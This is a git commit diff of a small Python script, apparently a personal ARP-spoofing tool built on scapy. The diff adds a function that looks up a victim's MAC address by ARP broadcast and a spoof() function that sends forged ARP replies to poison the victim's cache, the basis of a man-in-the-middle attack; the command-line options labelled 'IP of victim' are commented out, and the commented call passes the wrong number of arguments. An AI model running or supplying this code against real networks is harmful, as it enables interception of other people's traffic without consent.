da2de80fc37aa1750e74eec60838f3dcbee7c295
zctrans <zocwu113@gmail.com>
2022-12-19 19:42:55 +0300

    latest

--- arpspoofer/main.py
+++ arpspoofer/main.py
@@ -1,22 +1,34 @@
 import scapy.all as scapy
 import argparse
 
-def create_packet(ip, mac, route_ip):
+def get_mac_by_ip(ip):
+    arp_request = scapy.ARP(pdst=ip)
+    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
+    arp_request_broadcast = broadcast / arp_request
+    
+    ans = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
+    return ans[0][1].hwsrc
+
+
+def spoof(target_ip, spoof_ip):
+    target_mac = get_mac_by_ip(target_ip)
     packet = scapy.ARP(
         op=2,
-        pdst=ip,
-        hwdst=mac,
-        psrc=route_ip
+        pdst=target_ip,
+        hwdst=target_mac,
+        psrc=spoof_ip
     )
-    return packet
+    scapy.send(packet)
 
 
-argparser = argparse.ArgumentParser()
-argparser.add_argument('-ti', type=str, dest='ti', help='IP of victim') # target ip
-argparser.add_argument('-tm', type=str, dest='tm', help='MAC of victim') # target mac
-argparser.add_argument('-ri', type=str, dest='ri', help='IP of route') # route ip
-args = argparser.parse_args()
+
+# argparser = argparse.ArgumentParser()
+# argparser.add_argument('-ti', type=str, dest='ti', help='IP of victim') # target ip
+# argparser.add_argument('-tm', type=str, dest='tm', help='MAC of victim') # target mac
+# argparser.add_argument('-ri', type=str, dest='ri', help='IP of route') # route ip
+# args = argparser.parse_args()
+
+# spoof(args.ti, args.tm, args.ri)
 
 
-packet = create_packet(args.ti, args.tm, args.ri)
-scapy.send(packet)
+
